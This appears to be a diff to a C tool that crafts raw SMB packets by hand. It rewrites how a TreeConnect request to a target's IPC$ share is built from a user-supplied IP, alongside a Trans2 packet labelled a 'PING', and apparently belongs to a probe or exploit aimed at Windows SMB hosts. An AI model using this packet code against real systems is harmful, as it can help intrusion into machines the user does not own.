@@ -19,6 +19,7 @@ unsigned char Session_Setup_AndX_Request[] =
 "\x00\x01\x00\x00\x00\x0b\x00\x00\x00\x6e\x74\x00\x70\x79\x73\x6d"
 "\x62\x00";
 
+/* 
 unsigned char TreeConnect_AndX_Request[] =
 "\x00\x00\x00\x58\xff\x53\x4d\x42\x75\x00"
 "\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
@@ -26,8 +27,14 @@ unsigned char TreeConnect_AndX_Request[] =
 "\x00\x01\x00\x2d\x00\x00\x5c\x00\x5c\x00\x31\x00\x37\x00\x32\x00"
 "\x2e\x00\x32\x00\x32\x00\x2e\x00\x35\x00\x2e\x00\x34\x00\x36\x00"
 "\x5c\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00\x3f\x3f\x3f\x3f"
-"\x3f\x00";
-unsigned char ModifiedTreeConnectRequest[sizeof(TreeConnect_AndX_Request)+20];
+"\x3f\x00";*/
+unsigned char SMB_TreeConnectAndX[] =
+"\x00\x00\x00\x5A\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
+"\x00\x08\x30\x00\x04\xFF\x00\x5A\x00\x08\x00\x01\x00\x2F\x00\x00";
+
+unsigned char SMB_TreeConnectAndX_[] = "\x00\x00\x3F\x3F\x3F\x3F\x3F\x00";
+
 
 //Fixed Trans2 session setup PING packet.  This should work
 unsigned char trans2_request[] = 
@@ -331,30 +338,31 @@ int main(int argc, char* argv[])
 	
 	//Generates a new TreeConnect request with the correct IP address
 	//rather than the hard coded one embedded in the TreeConnect string
-	int i;
-	char hostipc[40];
-	char hostipc2[40*2];
-	char smblen;
-	char unclen;
-	sprintf((char *)hostipc,"\\\\%s\\ipc$", argv[1]);
-	for (i=0; i<40; i++)
-	{
-		hostipc2[i*2] = hostipc[i];
-		hostipc2[i*2+1] = 0;
-	}
-	memcpy(ModifiedTreeConnectRequest, TreeConnect_AndX_Request, sizeof(TreeConnect_AndX_Request)-1);
-	memcpy(ModifiedTreeConnectRequest+48, &hostipc2[0], strlen(hostipc)*2);
-	memcpy(ModifiedTreeConnectRequest+47+strlen(hostipc)*2, TreeConnect_AndX_Request+87, 9);
-	smblen = 52+(char)strlen(hostipc)*2;
-	memcpy(ModifiedTreeConnectRequest+3, &smblen, 1);
-	unclen = 9 + (char)strlen(hostipc)*2;
-	memcpy(ModifiedTreeConnectRequest+45, &unclen, 1);
+	//generate dynamic TreeConnect packet
+	unsigned char packet[4096];
+	unsigned char *ptr;
+	unsigned char tmp[1024];
+	unsigned short smblen;
+	ptr = packet;
+	memcpy(ptr, SMB_TreeConnectAndX, sizeof(SMB_TreeConnectAndX) - 1);
+	ptr += sizeof(SMB_TreeConnectAndX) - 1;
+	sprintf((char*)tmp, "\\\\%s\\IPC$", argv[1]);
+	convert_name((char*)ptr, (char*)tmp);
+	smblen = strlen((char*)tmp) * 2;
+	ptr += smblen;
+	smblen += 9;
+	memcpy(packet + sizeof(SMB_TreeConnectAndX) - 1 - 3, &smblen, 1);
+	memcpy(ptr, SMB_TreeConnectAndX_, sizeof(SMB_TreeConnectAndX_) - 1);
+	ptr += sizeof(SMB_TreeConnectAndX_) - 1;
+	smblen = ptr - packet;
+	smblen -= 4;
+	memcpy(packet + 3, &smblen, 1);
+
 	//update UserID in modified TreeConnect Request
-	memcpy(ModifiedTreeConnectRequest + 0x20, (char*)&userid, 2); //update userid
-		
-	//send TreeConnect request packet
-	printf("sending TreeConnect Request!\n");
-	send(sock, (char*)ModifiedTreeConnectRequest, sizeof(ModifiedTreeConnectRequest) - 1, 0);
+	memcpy(packet + 0x20, (char*)&userid, 2); //update userid
+
+	//send modified TreeConnect request
+	send(sock, (char*)packet, ptr - packet, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 	
 	//copy the treeID from the TreeConnect response
